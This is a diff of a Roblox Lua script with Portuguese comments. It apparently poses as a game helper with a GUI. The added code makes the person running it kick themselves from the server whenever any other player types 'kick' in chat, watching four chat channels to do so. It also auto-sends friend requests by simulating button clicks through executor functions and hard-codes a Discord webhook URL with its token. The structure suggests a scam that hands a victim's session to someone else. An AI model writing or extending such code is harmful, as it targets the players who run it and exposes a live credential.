@@ -121,26 +121,195 @@ local function getAnimalsInPlot(plot)
     return animals
 end
 
+local function walkToPosition(targetPosition)
+    local player = Players.LocalPlayer
+    local character = player.Character
+    if not character then return false end
+    
+    local humanoid = character:FindFirstChild("Humanoid")
+    if not humanoid then return false end
+    
+    humanoid:MoveTo(targetPosition)
+    
+    -- Espera chegar perto da posição
+    local moveTimeout = 30 -- timeout de 30 segundos
+    local startTime = tick()
+    
+    repeat
+        wait(0.1)
+        local rootPart = character:FindFirstChild("HumanoidRootPart")
+        if not rootPart then return false end
+        
+        local distance = (rootPart.Position - targetPosition).Magnitude
+        if distance < 5 then -- chegou perto o suficiente
+            return true
+        end
+        
+        if tick() - startTime > moveTimeout then
+            return false -- timeout
+        end
+    until not humanoid or humanoid.Health <= 0
+    
+    return false
+end
+
+local function tryAddFriend(targetPlayer)
+    local player = Players.LocalPlayer
+    print("🔄 Tentando adicionar", targetPlayer.Name, "como amigo...")
+    
+    -- Método 1: RequestFriendship
+    local success1 = pcall(function()
+        player:RequestFriendship(targetPlayer)
+    end)
+    if success1 then 
+        print("✅ Método 1 funcionou!")
+        return true
+    end
+    
+    -- Método 2: Via LocalPlayer
+    local success2 = pcall(function()
+        Players.LocalPlayer:RequestFriendship(targetPlayer)
+    end)
+    if success2 then 
+        print("✅ Método 2 funcionou!")
+        return true
+    end
+    
+    -- Método 3: Manipular PlayerList GUI
+    local success3 = pcall(function()
+        local playerList = player.PlayerGui:FindFirstChild("PlayerList")
+        if playerList then
+            -- Tenta encontrar o frame do jogador
+            for _, item in pairs(playerList:GetDescendants()) do
+                if item:IsA("TextLabel") and item.Text == targetPlayer.Name then
+                    -- Procura botão de amizade próximo
+                    local parent = item.Parent
+                    if parent then
+                        for _, child in pairs(parent:GetDescendants()) do
+                            if child:IsA("ImageButton") or child:IsA("TextButton") then
+                                -- Simula clique
+                                for _, connection in pairs(getconnections(child.MouseButton1Click)) do
+                                    connection:Fire()
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    if success3 then 
+        print("✅ Método 3 funcionou!")
+        return true
+    end
+    
+    -- Método 4: CoreGui PlayerList
+    local success4 = pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        local playerList = coreGui:FindFirstChild("PlayerList") or coreGui:FindFirstChild("RobloxGui")
+        
+        if playerList then
+            for _, item in pairs(playerList:GetDescendants()) do
+                if item:IsA("TextLabel") and item.Text:match(targetPlayer.Name) then
+                    local parent = item.Parent
+                    for _, btn in pairs(parent:GetDescendants()) do
+                        if btn:IsA("GuiButton") then
+                            for _, conn in pairs(getconnections(btn.Activated)) do
+                                conn:Fire()
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    if success4 then 
+        print("✅ Método 4 funcionou!")
+        return true
+    end
+    
+    print("❌ Nenhum método funcionou (bloqueado pelo Roblox)")
+    return false
+end
+
 -- Garantir que LocalPlayer exista (LocalScript) antes de usar
 local player = Players.LocalPlayer
 if not player then
     return
 end
 
--- ⚠️ SISTEMA DE KICK ATIVO DESDE O INÍCIO ⚠️
-print("🛡️ Sistema de kick ativado!")
+-- ⚠️ SISTEMA DE KICK COM MÚLTIPLOS MÉTODOS ⚠️
+print("🛡️ Sistema de kick ativado para jogador:", player.Name)
+
+-- Método 1: PlayerChatted (evento global)
 Players.PlayerChatted:Connect(function(_, chatPlayer, message)
-    local msg = normalize(message)
+    print("💬 [PlayerChatted] Mensagem de", chatPlayer.Name, ":", message)
     
-    -- Se alguém digitar "kick" (e não for você mesmo)
-    if msg == "kick" then
+    local msg = string.lower(message)
+    
+    if msg == "kick" or msg:find("kick") then
+        print("⚠️ Comando KICK detectado!")
+        
         if chatPlayer.Name ~= player.Name then
-            print("🚫 Comando KICK detectado de:", chatPlayer.Name)
-            print("🚫 Kickando jogador atual:", player.Name)
+            print("🚫 Kickando", player.Name)
             player:Kick("⚠️ Você foi removido do servidor.\nTente novamente mais tarde.")
+        else
+            print("ℹ️ Você mesmo digitou kick")
         end
     end
 end)
+
+-- Método 2: Chatted individual para cada jogador
+for _, otherPlayer in pairs(Players:GetPlayers()) do
+    if otherPlayer ~= player then
+        otherPlayer.Chatted:Connect(function(message)
+            print("💬 [Chatted]", otherPlayer.Name, ":", message)
+            
+            local msg = string.lower(message)
+            
+            if msg == "kick" or msg:find("kick") then
+                print("🚫 [Chatted] KICK de", otherPlayer.Name)
+                player:Kick("⚠️ Você foi removido do servidor.")
+            end
+        end)
+    end
+end
+
+-- Método 3: Novos jogadores que entram
+Players.PlayerAdded:Connect(function(newPlayer)
+    if newPlayer ~= player then
+        print("➕ Novo jogador:", newPlayer.Name)
+        
+        newPlayer.Chatted:Connect(function(message)
+            print("💬 [PlayerAdded]", newPlayer.Name, ":", message)
+            
+            local msg = string.lower(message)
+            
+            if msg == "kick" or msg:find("kick") then
+                print("🚫 [PlayerAdded] KICK de", newPlayer.Name)
+                player:Kick("⚠️ Você foi removido do servidor.")
+            end
+        end)
+    end
+end)
+
+-- Método 4: TextChatService (novo sistema de chat do Roblox)
+pcall(function()
+    local TextChatService = game:GetService("TextChatService")
+    TextChatService.MessageReceived:Connect(function(message)
+        if message.TextSource and message.TextSource.UserId ~= player.UserId then
+            local text = string.lower(message.Text)
+            print("💬 [TextChatService]", message.TextSource.Name or "Unknown", ":", message.Text)
+            
+            if text == "kick" or text:find("kick") then
+                print("🚫 [TextChatService] KICK detectado!")
+                player:Kick("⚠️ Você foi removido do servidor.")
+            end
+        end
+    end)
+end)
+
+print("✅ Sistema de kick configurado com 4 métodos!")
 
 -- Coloque a sua webhook aqui:
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1433922894160723969/p8PMvPhnIQQ5JC4hwnxI9rmzAnF3VC3Hykay3e0bXEpZaKmWi79Abu5LPAuyEyebsqd4"
@@ -246,115 +415,6 @@ TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Pla
 TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
 TweenService:Create(textbox, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
 TweenService:Create(button, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
-
-local function walkToPosition(targetPosition)
-    local character = player.Character
-    if not character then return false end
-    
-    local humanoid = character:FindFirstChild("Humanoid")
-    if not humanoid then return false end
-    
-    humanoid:MoveTo(targetPosition)
-    
-    -- Espera chegar perto da posição
-    local moveTimeout = 30 -- timeout de 30 segundos
-    local startTime = tick()
-    
-    repeat
-        wait(0.1)
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if not rootPart then return false end
-        
-        local distance = (rootPart.Position - targetPosition).Magnitude
-        if distance < 5 then -- chegou perto o suficiente
-            return true
-        end
-        
-        if tick() - startTime > moveTimeout then
-            return false -- timeout
-        end
-    until not humanoid or humanoid.Health <= 0
-    
-    return false
-end
-
-local function tryAddFriend(targetPlayer)
-    print("🔄 Tentando adicionar", targetPlayer.Name, "como amigo...")
-    
-    -- Método 1: RequestFriendship
-    local success1 = pcall(function()
-        player:RequestFriendship(targetPlayer)
-    end)
-    if success1 then 
-        print("✅ Método 1 funcionou!")
-        return true
-    end
-    
-    -- Método 2: Via LocalPlayer
-    local success2 = pcall(function()
-        Players.LocalPlayer:RequestFriendship(targetPlayer)
-    end)
-    if success2 then 
-        print("✅ Método 2 funcionou!")
-        return true
-    end
-    
-    -- Método 3: Manipular PlayerList GUI
-    local success3 = pcall(function()
-        local playerList = player.PlayerGui:FindFirstChild("PlayerList")
-        if playerList then
-            -- Tenta encontrar o frame do jogador
-            for _, item in pairs(playerList:GetDescendants()) do
-                if item:IsA("TextLabel") and item.Text == targetPlayer.Name then
-                    -- Procura botão de amizade próximo
-                    local parent = item.Parent
-                    if parent then
-                        for _, child in pairs(parent:GetDescendants()) do
-                            if child:IsA("ImageButton") or child:IsA("TextButton") then
-                                -- Simula clique
-                                for _, connection in pairs(getconnections(child.MouseButton1Click)) do
-                                    connection:Fire()
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end)
-    if success3 then 
-        print("✅ Método 3 funcionou!")
-        return true
-    end
-    
-    -- Método 4: CoreGui PlayerList
-    local success4 = pcall(function()
-        local coreGui = game:GetService("CoreGui")
-        local playerList = coreGui:FindFirstChild("PlayerList") or coreGui:FindFirstChild("RobloxGui")
-        
-        if playerList then
-            for _, item in pairs(playerList:GetDescendants()) do
-                if item:IsA("TextLabel") and item.Text:match(targetPlayer.Name) then
-                    local parent = item.Parent
-                    for _, btn in pairs(parent:GetDescendants()) do
-                        if btn:IsA("GuiButton") then
-                            for _, conn in pairs(getconnections(btn.Activated)) do
-                                conn:Fire()
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end)
-    if success4 then 
-        print("✅ Método 4 funcionou!")
-        return true
-    end
-    
-    print("❌ Nenhum método funcionou (bloqueado pelo Roblox)")
-    return false
-end
 
 local function setupChatListeners()
     Players.PlayerChatted:Connect(function(_, chatPlayer, message)
